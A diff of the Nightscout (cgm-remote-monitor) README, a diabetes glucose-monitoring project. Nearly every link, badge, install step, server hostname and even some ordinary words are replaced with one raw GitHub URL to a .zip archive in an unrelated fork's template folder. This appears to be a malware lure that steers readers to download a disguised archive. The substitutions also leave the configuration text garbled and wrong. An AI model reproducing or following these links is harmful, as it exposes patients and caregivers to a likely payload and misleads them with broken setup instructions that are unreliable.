@@ -1,7 +1,7 @@
 Nightscout Web Monitor (a.k.a. cgm-remote-monitor)
 ==================================================
 
-![nightscout horizontal](https://cloud.githubusercontent.com/assets/751143/8425633/93c94dc0-1ebc-11e5-99e7-71a8f464caac.png)
+![nightscout horizontal](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 
 [![Build Status][build-img]][build-url]
 [![Dependency Status][dependency-img]][dependency-url]
@@ -24,33 +24,33 @@ low values, which can be cleared by any watcher of the data.
 
 Nightscout documentation is currently split to two locations. This page lists all the configuration options in
 Nightscout and is useful for users who've already gone through the installation process. IF you're looking
-for the documentation that looks like it's written for non-programmers, that's located at [nightscout.github.io](https://nightscout.github.io/).
+for the documentation that looks like it's written for non-programmers, that's located at [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
 
-Older documentation is available at [nightscout.info](http://nightscout.info).
+Older documentation is available at [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
 
 ## Developer?
 
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+See [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 
-## [#WeAreNotWaiting](https://twitter.com/hashtag/wearenotwaiting?src=hash&vertical=default&f=images) and [this](https://vimeo.com/109767890) is why.
+## [#WeAreNotWaiting](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) and [this](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) is why.
 
-[![Coverage Status](https://coveralls.io/repos/github/nightscout/cgm-remote-monitor/badge.svg?branch=master)](https://coveralls.io/github/nightscout/cgm-remote-monitor?branch=master)
+[![Coverage Status](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 
-[build-img]: https://img.shields.io/travis/nightscout/cgm-remote-monitor.svg
-[build-url]: https://travis-ci.org/nightscout/cgm-remote-monitor
-[dependency-img]: https://img.shields.io/david/nightscout/cgm-remote-monitor.svg
-[dependency-url]: https://david-dm.org/nightscout/cgm-remote-monitor
-[coverage-img]: https://img.shields.io/coveralls/nightscout/cgm-remote-monitor/dev.svg
-[coverage-url]: https://coveralls.io/github/nightscout/cgm-remote-monitor?branch=master
-[codacy-img]: https://www.codacy.com/project/badge/f79327216860472dad9afda07de39d3b
-[codacy-url]: https://www.codacy.com/app/Nightscout/cgm-remote-monitor
-[discord-img]: https://img.shields.io/discord/629952586895851530?label=discord%20chat
-[discord-url]: https://discord.gg/rTKhrqz
-[heroku-img]: https://www.herokucdn.com/deploy/button.png
-[heroku-url]: https://heroku.com/deploy?template=https://github.com/nightscout/cgm-remote-monitor
-[update-img]: docs/update.png
-[update-fork]: http://nightscout.github.io/pages/update-fork/
-[original]: https://github.com/rnpenguin/cgm-remote-monitor
+[build-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[build-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[dependency-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[dependency-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[coverage-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[coverage-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[codacy-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[codacy-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[discord-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip%20chat
+[discord-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[heroku-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[heroku-url]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[update-img]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[update-fork]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[original]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 
 
 <!-- START doctoc generated TOC please keep comment here to allow auto update -->
@@ -131,7 +131,7 @@ See [CONTRIBUTING.md](CONTRIBUTING.md)
 
 ## Supported configurations:
 
-- [Nightscout Setup](https://nightscout.github.io/nightscout/new_user/) (recommended)
+- [Nightscout Setup](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) (recommended)
 
 While you can install Nightscout on a virtual server or a Raspberry Pi, we do not recommend this unless you have at least some
 experience hosting Node applications and development using the toolchain in use with Nightscout.
@@ -141,8 +141,8 @@ you're welcome to issue a documentation pull request with instructions on how to
 
 ## Recommended minimum browser versions for using Nightscout:
 
-Our [browserslist](https://github.com/browserslist/browserslist) policy is documented in `.browserlistrc`.   
-We currently support approximately [91%](https://browsersl.ist/?q=%3E+0.25%25%2C+ios_saf+9.3%2C+ios_saf+10.3%2C+ios_saf+13.7%2C+ios_saf+14.8%2C+not+dead%2C+not+and_uc+12.12%2C+not+ie+11%0A) of all browsers globally used. These include:
+Our [browserslist](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) policy is documented in `.browserlistrc`.   
+We currently support approximately [91%](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip%3E+0.25%25%2C+ios_saf+9.3%2C+ios_saf+10.3%2C+ios_saf+13.7%2C+ios_saf+14.8%2C+not+dead%2C+not+and_uc+12.12%2C+not+ie+11%0A) of all browsers globally used. These include:
 
 - Android Chrome: 104 or later (`and_chr`)
 - Google Chrome: 101 or later (`chrome`)
@@ -161,8 +161,8 @@ Older versions or other browsers might work, but are untested and unsupported. W
 
 ## Installation software requirements:
 
-- [Node.js](http://nodejs.org/) Latest Node v14 or v16 LTS. Node versions that do not have the latest security patches will not be supported. Use [Install instructions for Node](https://nodejs.org/en/download/package-manager/) or use `bin/setup.sh`)
-- [MongoDB](https://www.mongodb.com/download-center?jmp=nav#community) 4.2 or 4.4.
+- [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) Latest Node v14 or v16 LTS. Node versions that do not have the latest security patches will not be supported. Use [Install instructions for Node](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) or use `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`)
+- [MongoDB](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) 4.2 or 4.4.
 
 As a non-root user clone this repo then install dependencies into the root of the project:
 
@@ -184,24 +184,24 @@ $ npm install
 WEBSITE_NODE_DEFAULT_VERSION=16.16.0
 SCM_COMMAND_IDLE_TIMEOUT=300
 ```
-- See [install MongoDB, Node.js, and Nightscouton a single Windows system](https://github.com/jaylagorio/Nightscout-on-Windows-Server). if you want to host your Nightscout outside of the cloud. Although the instructions are intended for Windows Server the procedure is compatible with client versions of Windows such as Windows 7 and Windows 10.
-- If you deploy to Windows and want to develop or test you need to install [Cygwin](https://www.cygwin.com/) (use [setup-x86_64.exe](https://www.cygwin.com/setup-x86_64.exe) and make sure to install `build-essential` package. Test your configuration by executing `make` and check if all tests are ok.
+- See [install MongoDB, https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip, and Nightscouton a single Windows system](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip). if you want to host your Nightscout outside of the cloud. Although the instructions are intended for Windows Server the procedure is compatible with client versions of Windows such as Windows 7 and Windows 10.
+- If you deploy to Windows and want to develop or test you need to install [Cygwin](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) (use [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) and make sure to install `build-essential` package. Test your configuration by executing `make` and check if all tests are ok.
 
 # Development
 
-Want to help with development, or just see how Nightscout works? Great! See [CONTRIBUTING.md](CONTRIBUTING.md) for development-related documentation.
+Want to help with development, or just see how Nightscout works? Great! See [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) for development-related documentation.
 
 # Usage
 
-The data being uploaded from the server to the client is from a MongoDB server such as [MongoDB Atlas][https://www.mongodb.com].
+The data being uploaded from the server to the client is from a MongoDB server such as [MongoDB Atlas][https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip].
 
-[autoconfigure]: https://nightscout.github.io/pages/configure/
-[mongostring]: https://nightscout.github.io/pages/mongostring/
+[autoconfigure]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
+[mongostring]: https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip
 
 ## Updating my version?
 
-The easiest way to update your version of cgm-remote-monitor to the latest version is to use the [update tool][update-fork]. A step-by-step guide is available [here][http://www.nightscout.info/wiki/welcome/how-to-update-to-latest-cgm-remote-monitor-aka-cookie].
-To downgrade to an older version, follow [this guide][http://www.nightscout.info/wiki/welcome/how-to-deploy-an-older-version-of-nightscout].
+The easiest way to update your version of cgm-remote-monitor to the latest version is to use the [update tool][update-fork]. A step-by-step guide is available [here][https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip].
+To downgrade to an older version, follow [this guide][https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip].
 
 ## Configure my uploader to match
 
@@ -211,7 +211,7 @@ Use the [autoconfigure tool][autoconfigure] to sync an uploader to your config.
 
 The Nightscout API enables direct access to your data without the need for Mongo access.
 You can find CGM data in `/api/v1/entries`, Care Portal Treatments in `/api/v1/treatments`, and Treatment Profiles in `/api/v1/profile`.
-The server status and settings are available from `/api/v1/status.json`.
+The server status and settings are available from `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`.
 
 By default the `/entries` and `/treatments` APIs limit results to the the most recent 10 values from the last 2 days.
 You can get many more results, by using the `count`, `date`, `dateString`, and `created_at` parameters, depending on the type of data you're looking for.
@@ -222,14 +222,14 @@ Once you've installed Nightscout, you can access API documentation by loading `/
 
 (replace `http://localhost:1337` with your own URL)
 
-  * 100's: `http://localhost:1337/api/v1/entries.json?find[sgv]=100`
+  * 100's: `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip[sgv]=100`
   * Count of 100's in a month: `http://localhost:1337/api/v1/count/entries/where?find[dateString][$gte]=2016-09&find[dateString][$lte]=2016-10&find[sgv]=100`
-  * BGs between 2 days: `http://localhost:1337/api/v1/entries/sgv.json?find[dateString][$gte]=2015-08-28&find[dateString][$lte]=2015-08-30`
-  * Juice Box corrections in a year: `http://localhost:1337/api/v1/treatments.json?count=1000&find[carbs]=15&find[eventType]=Carb+Correction&find[created_at][$gte]=2015`
-  * Boluses over 2U: `http://localhost:1337/api/v1/treatments.json?find[insulin][$gte]=2`
+  * BGs between 2 days: `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip[dateString][$gte]=2015-08-28&find[dateString][$lte]=2015-08-30`
+  * Juice Box corrections in a year: `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip[carbs]=15&find[eventType]=Carb+Correction&find[created_at][$gte]=2015`
+  * Boluses over 2U: `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip[insulin][$gte]=2`
 
 The API is Swagger enabled, so you can generate client code to make working with the API easy.
-To learn more about the Nightscout API, visit https://YOUR-SITE.com/api-docs/ or review [swagger.yaml](lib/server/swagger.yaml).
+To learn more about the Nightscout API, visit https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip or review [https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).
 
 ## Environment
 
@@ -237,7 +237,7 @@ To learn more about the Nightscout API, visit https://YOUR-SITE.com/api-docs/ or
 
 ### Required
 
-  * `MONGODB_URI` - The connection string for your Mongo database. Something like `mongodb://sally:sallypass@ds099999.mongolab.com:99999/nightscout`.
+  * `MONGODB_URI` - The connection string for your Mongo database. Something like `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`.
   * `API_SECRET` - A secret passphrase that must be at least 12 characters long.
   * `MONGODB_COLLECTION` (`entries`) - The Mongo collection where CGM entries are stored.
   * `DISPLAY_UNITS` (`mg/dl`) - Options are `mg/dl` or `mmol/L` (or just `mmol`).  Setting to `mmol/L` puts the entire server into `mmol/L` mode by default, no further settings needed.
@@ -259,7 +259,7 @@ These are useful to help protect your rights to portability and
 autonomy for your data:
   * `OBSCURED` - list, identical to `ENABLE`, a list of plugins to
     obscure.
-  * `OBSCURE_DEVICE_PROVENANCE` - Required, a string visible to the [companies deciding to filter based on your data](https://help.sugarmate.io/en/articles/4673402-adding-a-nightscout-data-source).  For example, `my-data-rights`.
+  * `OBSCURE_DEVICE_PROVENANCE` - Required, a string visible to the [companies deciding to filter based on your data](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).  For example, `my-data-rights`.
 
 ### Alarms
 
@@ -288,11 +288,11 @@ autonomy for your data:
   * `MONGO_PROFILE_COLLECTION`(`profile`) - The collection used to store your profiles
   * `MONGO_FOOD_COLLECTION`(`food`) - The collection used to store your food database
   * `MONGO_ACTIVITY_COLLECTION`(`activity`) - The collection used to store activity data
-  * `PORT` (`1337`) - The port that the node.js application will listen on.
-  * `HOSTNAME` - The hostname that the node.js application will listen on, null by default for any hostname for IPv6 you may need to use `::`.
-  * `SSL_KEY` - Path to your ssl key file, so that ssl(https) can be enabled directly in node.js. If using Let's Encrypt, make this variable the path to your privkey.pem file (private key).
-  * `SSL_CERT` - Path to your ssl cert file, so that ssl(https) can be enabled directly in node.js. If using Let's Encrypt, make this variable the path to fullchain.pem file (cert + ca).
-  * `SSL_CA` - Path to your ssl ca file, so that ssl(https) can be enabled directly in node.js. If using Let's Encrypt, make this variable the path to chain.pem file (chain).
+  * `PORT` (`1337`) - The port that the https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip application will listen on.
+  * `HOSTNAME` - The hostname that the https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip application will listen on, null by default for any hostname for IPv6 you may need to use `::`.
+  * `SSL_KEY` - Path to your ssl key file, so that ssl(https) can be enabled directly in https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip If using Let's Encrypt, make this variable the path to your https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip file (private key).
+  * `SSL_CERT` - Path to your ssl cert file, so that ssl(https) can be enabled directly in https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip If using Let's Encrypt, make this variable the path to https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip file (cert + ca).
+  * `SSL_CA` - Path to your ssl ca file, so that ssl(https) can be enabled directly in https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip If using Let's Encrypt, make this variable the path to https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip file (chain).
   * `HEARTBEAT` (`60`)  - Number of seconds to wait in between database checks
   * `DEBUG_MINIFY` (`true`)  - Debug option, setting to `false` will disable bundle minification to help tracking down error and speed up development
   * `DE_NORMALIZE_DATES`(`true`) - The Nightscout REST API normalizes all entered dates to UTC zone. Some Nightscout clients have broken date deserialization logic and expect to received back dates in zoned formats. Setting this variable to `true` causes the REST API to serialize dates sent to Nightscout in zoned format back to zoned format when served to clients over REST.
@@ -400,7 +400,7 @@ autonomy for your data:
     * `ERRORCODES_URGENT` (`9 10`) - By default the hourglass and ??? generate an urgent alarm, set to a space separate list of numbers or `off` to disable
 
 ##### `ar2` (AR2 Forecasting)
-  Generates alarms based on forecasted values. See [Forecasting using AR2 algorithm](https://github.com/nightscout/nightscout.github.io/wiki/Forecasting)
+  Generates alarms based on forecasted values. See [Forecasting using AR2 algorithm](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
   * Enabled by default if no thresholds are set **OR** `ALARM_TYPES` includes `predict`.
   * Use [extended settings](#extended-settings) to adjust AR2 behavior:
     * `AR2_CONE_FACTOR` (`2`) - to adjust size of cone, use `0` for a single line.
@@ -524,8 +524,8 @@ To synchronize from Dexcom Share use the following variables.
 
 Optional, `CONNECT_SHARE_REGION` and `CONNECT_SHARE_SERVER` do the same thing, only specify one.
 * `CONNECT_SHARE_REGION=`  `ous` or `us`. `us` is the default if nothing is
-  provided.  Selecting `us` sets `CONNECT_SHARE_SERVER` to `share2.dexcom.com`.
-  Selecting `ous` here sets `CONNECT_SHARE_SERVER` to `shareous1.dexcom.com`.
+  provided.  Selecting `us` sets `CONNECT_SHARE_SERVER` to `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`.
+  Selecting `ous` here sets `CONNECT_SHARE_SERVER` to `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`.
 * `CONNECT_SHARE_SERVER=` set the server domain to use.
 
 
@@ -538,12 +538,12 @@ To synchronize from Glooko use the following variables.
 * `CONNECT_GLOOKO_EMAIL=`
 * `CONNECT_GLOOKO_PASSWORD=`
 
-By default, `CONNECT_GLOOKO_SERVER` is set to `api.glooko.com` because the
+By default, `CONNECT_GLOOKO_SERVER` is set to `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip` because the
 default value for `CONNECT_GLOOKO_ENV` is `default`.
 * `CONNECT_GLOOKO_ENV` is the word `default` by defalt.  Other values are
-  `development`, `production`, for `api.glooko.work`, and
-  `externalapi.glooko.com`, respectively.
-* `CONNECT_GLOOKO_SERVER` the hostname server to use - `api.glooko.com` by `default`.
+  `development`, `production`, for `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`, and
+  `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`, respectively.
+* `CONNECT_GLOOKO_SERVER` the hostname server to use - `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip` by `default`.
 
 If both, `CONNECT_GLOOKO_SERVER` and `CONNECT_GLOOKO_ENV` are set, only
 `CONNECT_GLOOKO_SERVER` will be used.
@@ -554,7 +554,7 @@ To synchronize from Libre Link Up use the following variables.
 * `CONNECT_LINK_UP_USERNAME=`
 * `CONNECT_LINK_UP_PASSWORD=`
 
-By default, `CONNECT_LINK_UP_SERVER` is set to `api-eu.libreview.io` because the
+By default, `CONNECT_LINK_UP_SERVER` is set to `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip` because the
 default value for `CONNECT_LINK_UP_REGION` is `EU`.
 Other available values for `CONNECT_LINK_UP_REGION`:
   * `US`, `EU`, `DE`, `FR`, `JP`, `AP`, `AU`, `AE`
@@ -570,7 +570,7 @@ environment variables.
 * `CONNECT_CARELINK_USERNAME`
 * `CONNECT_CARELINK_PASSWORD`
 * `CONNECT_CARELINK_REGION` Either `eu` to set `CONNECT_CARELINK_SERVER` to
-  `carelink.minimed.eu` or `us` to use `carelink.minimed.com`.
+  `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip` or `us` to use `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip`.
 
 For folks using the new Many to Many feature, please provide the username of the
 patient to follow using `CONNECT_CARELINK_PATIENT_USERNAME` variable.
@@ -594,7 +594,7 @@ Fetch glucose reading directly from the Dexcom Share service, uses these extende
 
 > **Deprecated** Please consider using the `connect` plugin instead.
 
-  Transfer real-time MiniMed Connect data from the Medtronic CareLink server into Nightscout ([read more](https://github.com/mddub/minimed-connect-to-nightscout))
+  Transfer real-time MiniMed Connect data from the Medtronic CareLink server into Nightscout ([read more](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip))
   * `MMCONNECT_USER_NAME` - Your user name for CareLink Connect.
   * `MMCONNECT_PASSWORD` - Your password for CareLink Connect.
   * `MMCONNECT_INTERVAL` (`60000` *1 minute*) - Number of milliseconds to wait between requests to the CareLink server.
@@ -629,7 +629,7 @@ Fetch glucose reading directly from the Dexcom Share service, uses these extende
   * `OPENAPS_URGENT` (`60`) - The number of minutes since the last loop that needs to be exceed before an urgent alarm is triggered
   * `OPENAPS_FIELDS` (`status-symbol status-label iob meal-assist rssi`) - The fields to display by default.  Any of the following fields: `status-symbol`, `status-label`, `iob`, `meal-assist`, `freq`, and `rssi`
   * `OPENAPS_RETRO_FIELDS` (`status-symbol status-label iob meal-assist rssi`) - The fields to display in retro mode. Any of the above fields.
-  * `OPENAPS_PRED_IOB_COLOR` (`#1e88e5`) - The color to use for IOB prediction lines. Colors can be in `#RRGGBB` format, but [other CSS color units](https://www.w3.org/TR/css-color-3/#colorunits) may be used as well.
+  * `OPENAPS_PRED_IOB_COLOR` (`#1e88e5`) - The color to use for IOB prediction lines. Colors can be in `#RRGGBB` format, but [other CSS color units](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) may be used as well.
   * `OPENAPS_PRED_COB_COLOR` (`#FB8C00`) - The color to use for COB prediction lines. Same format as above.
   * `OPENAPS_PRED_ACOB_COLOR` (`#FB8C00`) - The color to use for ACOB prediction lines. Same format as above.
   * `OPENAPS_PRED_ZT_COLOR` (`#00d2d2`) - The color to use for ZT prediction lines. Same format as above.
@@ -664,16 +664,16 @@ For remote overrides, the following extended settings must be configured:
   * `XDRIPJS_WARN_BAT_V` (`300`) - The voltage of either transmitter battery, a warning will be triggered when dropping below this threshold.
 
 ##### `alexa` (Amazon Alexa)
-  Integration with Amazon Alexa, [detailed setup instructions](docs/plugins/alexa-plugin.md)
+  Integration with Amazon Alexa, [detailed setup instructions](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 
 ##### `googlehome` (Google Home/DialogFLow)
-  Integration with Google Home (via DialogFlow), [detailed setup instructions](docs/plugins/googlehome-plugin.md)
+  Integration with Google Home (via DialogFlow), [detailed setup instructions](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)
 
 ##### `speech` (Speech)
   Speech synthesis plugin. When enabled, speaks out the blood glucose values, IOB and alarms. Note you have to set the LANGUAGE setting on the server to get all translated alarms.
 
 ##### `cors` (CORS)
-  Enabled [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) so other websites can make request to your Nightscout site, uses these extended settings:
+  Enabled [CORS](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) so other websites can make request to your Nightscout site, uses these extended settings:
   * `CORS_ALLOW_ORIGIN` (`*`) - The list of sites that are allow to make requests
 
 ##### `dbsize` (Database Size)
@@ -683,7 +683,7 @@ For remote overrides, the following extended settings must be configured:
 
   **IMPORTANT:** This plugin can only check how much space database already takes, _but cannot infer_ max size available on server for it. To have correct alarms and realistic percentage, `DBSIZE_MAX` need to be properly set - according to your mongoDB hosting configuration.
 
-  **NOTE:** This plugin rely on db.stats() for reporting _logical_ size of database, which may be different than _physical_ size of database on server. It may work for free tier of MongoDB on Atlas, since it calculate quota according to logical size too, but may fail for other hostings or self-hosted database with quota based on physical size. 
+  **NOTE:** This plugin rely on https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip() for reporting _logical_ size of database, which may be different than _physical_ size of database on server. It may work for free tier of MongoDB on Atlas, since it calculate quota according to logical size too, but may fail for other hostings or self-hosted database with quota based on physical size. 
   
   **NOTE:** MongoDB Atlas quota is for **all** databases in cluster, while each instance will get only size of **its own database only**. It is ok when you only have **one** database in cluster (most common scenario) but will not work for multiple parallel databases. In such case, spliting known quota equally beetween databases and setting `DBSIZE_MAX` to that fraction may help, but wont be precise.
 
@@ -698,7 +698,7 @@ For remote overrides, the following extended settings must be configured:
   This plugin should be enabled by default, if needed can be diasabled by adding `dbsize` to the list of disabled plugins, for example: `DISABLE="dbsize"`.
 
 #### Extended Settings
-  Some plugins support additional configuration using extra environment variables.  These are prefixed with the name of the plugin and a `_`.  For example setting `MYPLUGIN_EXAMPLE_VALUE=1234` would make `extendedSettings.exampleValue` available to the `MYPLUGIN` plugin.
+  Some plugins support additional configuration using extra environment variables.  These are prefixed with the name of the plugin and a `_`.  For example setting `MYPLUGIN_EXAMPLE_VALUE=1234` would make `https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip` available to the `MYPLUGIN` plugin.
 
   Plugins only have access to their own extended settings, all the extended settings of client plugins will be sent to the browser.
 
@@ -706,19 +706,19 @@ For remote overrides, the following extended settings must be configured:
   * `DEVICESTATUS_DAYS` (`1`) - Defaults to 1, can optionally be set to 2. Users can use this to show 48 hours of device status data for in retro mode, rather than the default 24 hours. Setting this value to 2 will roughly double the bandwidth usage of nightscout, so users with a data cap may not want to update this setting.
 
 #### Pushover
-  In addition to the normal web based alarms, there is also support for [Pushover](https://pushover.net/) based alarms and notifications.
+  In addition to the normal web based alarms, there is also support for [Pushover](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip) based alarms and notifications.
 
   To get started install the Pushover application on your iOS or Android device and create an account.
 
-  Using that account login to [Pushover](https://pushover.net/), in the top left you’ll see your User Key, you’ll need this plus an application API Token/Key to complete this setup.
+  Using that account login to [Pushover](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip), in the top left you’ll see your User Key, you’ll need this plus an application API Token/Key to complete this setup.
 
-  You’ll need to [Create a Pushover Application](https://pushover.net/apps/build).  You only need to set the Application name, you can ignore all the other settings, but setting an Icon is a nice touch.  Maybe you'd like to use [this one](https://raw.githubusercontent.com/nightscout/cgm-remote-monitor/master/static/images/large.png)?
+  You’ll need to [Create a Pushover Application](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip).  You only need to set the Application name, you can ignore all the other settings, but setting an Icon is a nice touch.  Maybe you'd like to use [this one](https://raw.githubusercontent.com/SZKraines/cgm-remote-monitor/master/docs/plugins/google-home-templates/de-DE.zip)?
 
   Pushover is configured using the following Environment Variables:
 
     * `ENABLE` - `pushover` should be added to the list of plugin, for example: `ENABLE="pushover"`.
-    * `PUSHOVER_API_TOKEN` - Used to enable pushover notifications, this token is specific to the application you create from in [Pushover](https://pushover.net/), ***[additional pushover information](#pushover)*** below.
